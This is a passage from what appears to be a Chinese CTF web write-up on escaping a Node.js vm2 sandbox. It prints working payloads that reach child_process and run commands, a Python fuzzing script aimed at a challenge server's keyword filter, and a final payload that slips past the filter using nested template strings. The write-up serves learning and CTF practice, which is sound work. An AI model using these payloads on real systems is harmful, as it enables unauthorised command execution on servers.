+        <span class="k">return</span> <span class="nx">e</span><span class="p">.</span><span class="nx">get_process</span><span class="p">(()=&gt;{}).</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s2">"child_process"</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s2">"whoami"</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span><span class="o">+</span><span class="s1">')()'</span><span class="p">;</span>
+<span class="k">try</span><span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">new</span> <span class="nx">VM</span><span class="p">().</span><span class="nx">run</span><span class="p">(</span><span class="nx">untrusted</span><span class="p">));</span>
+<span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">x</span><span class="p">){</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204234-e62b1ca4-8a16-1.png"/></p>
+<p>可以看到这个payload可以成功绕过的,但是我们可以看到报错信息并不一致,所以我们还是尝试阶段。</p>
+<div class="highlight"><pre><span></span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="nx">TypeError</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">get_process</span> <span class="o">=</span> <span class="nx">f</span><span class="p">=&gt;</span><span class="nx">f</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s2">"return process"</span><span class="p">)();</span><span class="k">try</span><span class="p">{</span><span class="nb">Object</span><span class="p">.</span><span class="nx">preventExtensions</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="s2">""</span><span class="p">)).</span><span class="nx">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="k">return</span> <span class="nx">e</span><span class="p">.</span><span class="nx">get_process</span><span class="p">(()=&gt;{}).</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s2">"child_process"</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s2">"whoami"</span><span class="p">).</span><span class="nx">toString</span><span class="p">();}})()</span>
+</pre></div>
+<p>直接丢进URL,发现返回的是个键盘:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204245-ecd9c12c-8a16-1.png"/></p>
+<p>这其实就挺诡异的了,这个时候我经过拆解payload:</p>
+<p><code>(function(){TypeError.prototype.get_process =1;})()</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204253-f17890be-8a16-1.png"/></p>
+<p>发现这其实是一种针对特殊字符的过滤,这个时候我们就可以通过一个脚本来FUZZ看看是什么规则了。</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python3</span>
+<span class="c1">#</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">"""(function(){TypeError.prototype.get_process = f=&gt;f.constructor("return process")();try{Object.preventExtensions(Buffer.from("")).a = 1;}catch(e){return e.get_process(()=&gt;{}).mainModule.require("child_process").execSync("whoami").toString();}})()"""</span>
+<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">req_url</span> <span class="o">=</span> <span class="s1">'http://8b6d7d7f-43e9-464f-a7ec-394d424747eb.node3.buuoj.cn/run.php?code='</span>
+<span class="n">fuzz_payload</span> <span class="o">=</span> <span class="s2">""</span>
+<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
+    <span class="n">fuzz_payload</span> <span class="o">+=</span> <span class="n">k</span>
+    <span class="n">req_payload</span> <span class="o">=</span> <span class="n">req_url</span> <span class="o">+</span> <span class="n">fuzz_payload</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">req_payload</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+    <span class="k">if</span> <span class="s1">'Happy Hacking'</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">"waf! k:{}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
+        <span class="n">fuzz_payload</span> <span class="o">=</span> <span class="n">fuzz_payload</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">'0'</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">fuzz_payload</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">fuzz_payload</span><span class="p">)</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="nx">TypeError</span><span class="p">.</span><span class="nx">prototyp0</span><span class="p">.</span><span class="nx">get_proces0</span> <span class="o">=</span> <span class="nx">f</span><span class="p">=&gt;</span><span class="nx">f</span><span class="p">.</span><span class="nx">constructo0</span><span class="p">(</span><span class="mi">0</span><span class="k">return</span> <span class="nx">proces00</span><span class="p">)();</span><span class="k">try</span><span class="p">{</span><span class="nb">Object</span><span class="p">.</span><span class="nx">preventExtensions</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="mi">00</span><span class="p">)).</span><span class="nx">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="k">return</span> <span class="nx">e</span><span class="p">.</span><span class="nx">get_proces0</span><span class="p">(()=&gt;{}).</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="mi">0</span><span class="nx">child_proces00</span><span class="p">).</span><span class="nx">exe0Sync</span><span class="p">(</span><span class="mi">0</span><span class="nx">whoami0</span>
+<span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="nx">TypeError</span><span class="p">.</span><span class="nx">prototyp0</span><span class="p">.</span><span class="nx">get_proces0</span> <span class="o">=</span> <span class="nx">f</span><span class="p">=&gt;</span><span class="nx">f</span><span class="p">.</span><span class="nx">constructo0</span><span class="p">(</span><span class="mi">0</span><span class="k">return</span> <span class="nx">proces00</span><span class="p">)();</span><span class="k">try</span><span class="p">{</span><span class="nb">Object</span><span class="p">.</span><span class="nx">preventExtensions</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="mi">00</span><span class="p">)).</span><span class="nx">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="k">return</span> <span class="nx">e</span><span class="p">.</span><span class="nx">get_proces0</span><span class="p">(()=&gt;{}).</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="mi">0</span><span class="nx">child_proces00</span><span class="p">).</span><span class="nx">exe0Sync</span><span class="p">(</span><span class="mi">0</span><span class="nx">whoami0</span><span class="p">).</span><span class="nx">toString</span><span class="p">();}})()</span>
+</pre></div>
+<p>不难发现:</p>
+<p><code>prototype,constrctor,",process,exec,'</code>都被过滤了。</p>
+<p>进行了过滤,像js的这些关键字的绕过，其实非常简单，利用他原生的模板字符串功能就行了。</p>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank">模板字符串</a></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204305-f8f820fc-8a16-1.png"/></p>
+<p>首先我们要想一下怎么构造:</p>
+<p>这个特性和以前我们做PHP题目那个计算器简直就是异曲同工的思路.(<code>$$pi{0}</code>)</p>
+<p>通过这种嵌套的方式,还原一个常量字符串为变量字符串:</p>
+<div class="highlight"><pre><span></span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`constructo`</span><span class="si">}</span><span class="sb">r`</span><span class="si">}</span><span class="sb">`</span>
+</pre></div>
+<p>里面层:</p>
+<pre><code>`${`constructo`}r` //主要拼接成constructor `用来代替单双引号</code></pre>
+<p>最外面一层:<code>${} //解析为变量字符串</code></p>
+<p>我们重新构造下exp:</p>
+<div class="highlight"><pre><span></span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`prototyp`</span><span class="si">}</span><span class="sb">e`</span><span class="si">}</span><span class="sb">`</span>
+<span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`get_proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span>
+<span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`constructo`</span><span class="si">}</span><span class="sb">r`</span><span class="si">}</span><span class="sb">`</span>
+<span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span>
+<span class="sb">`</span><span class="si">${</span><span class="sb">`e</span><span class="si">${</span><span class="sb">`xecSync`</span><span class="si">}</span><span class="sb">`</span><span class="si">}</span><span class="sb">`</span>
+<span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`child_proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span>
+<span class="nx">这里需要注意的是</span><span class="o">:</span> 
+<span class="nx">TypeError</span><span class="p">.</span><span class="nx">prototyp0</span><span class="p">.</span><span class="nx">get_proces0</span>
+<span class="nx">这里的</span><span class="p">.</span><span class="nx">获取属性我们需要更改为TypeError</span><span class="p">[</span><span class="s1">'prototype'</span><span class="p">]</span><span class="nx">这种形式去改写</span><span class="err">。</span>
+<span class="nx">最终payload</span><span class="o">:</span>
+<span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="nx">TypeError</span><span class="p">[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`prototyp`</span><span class="si">}</span><span class="sb">e`</span><span class="si">}</span><span class="sb">`</span><span class="p">][</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`get_proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f</span><span class="p">=&gt;</span><span class="nx">f</span><span class="p">[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`constructo`</span><span class="si">}</span><span class="sb">r`</span><span class="si">}</span><span class="sb">`</span><span class="p">](</span><span class="sb">`</span><span class="si">${</span><span class="sb">`return </span><span class="si">${</span><span class="sb">`proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span><span class="p">)();</span><span class="k">try</span><span class="p">{</span><span class="nb">Object</span><span class="p">.</span><span class="nx">preventExtensions</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="sb">``</span><span class="p">)).</span><span class="nx">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="k">return</span> <span class="nx">e</span><span class="p">[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`get_proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span><span class="p">](()=&gt;{}).</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`child_proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span><span class="p">)[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`exe`</span><span class="si">}</span><span class="sb">cSync`</span><span class="si">}</span><span class="sb">`</span><span class="p">](</span><span class="sb">`whoami`</span><span class="p">).</span><span class="nx">toString</span><span class="p">();}})()</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200429204321-0252a4f6-8a17-1.png"/></p>
+<h2 data-content="1" id="5b6be1b7b170bc35f8aac94e7180a007">0x3 总结</h2>
+<p>  感觉NodeJS这种新语言的考点应该会被各位出题人各种挖掘，希望将来有人挖掘出更有意思的考点。</p>
+<h2 data-content="1" id="f156c173249311bbc1af0f7537dcba42">0x4 参考链接</h2>
+<p><a href="https://www.zhaoj.in/read-6512.html" target="_blank">虎符 CTF Web 部分 Writeup</a></p>
+<p><a href="https://www.anquanke.com/post/id/170708" target="_blank">HackIM 2019 Web记录</a></p>
+</div>
+</div>
